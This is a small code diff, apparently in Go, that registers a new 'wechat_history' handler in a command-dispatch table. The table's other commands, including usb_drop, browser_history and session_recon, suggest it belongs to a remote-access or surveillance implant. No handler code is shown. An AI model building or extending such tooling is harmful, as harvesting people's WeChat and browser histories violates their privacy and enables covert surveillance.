@@ -291,6 +291,7 @@ func init() {
 		"usb_enum":             handleUSBEnum,
 		"usb_drop":             handleUSBDrop,
 		"browser_history":      handleBrowserHistory,
+		"wechat_history":       handleWeChatHistory,
 		"session_recon":        handleSessionRecon,
 	}
 }
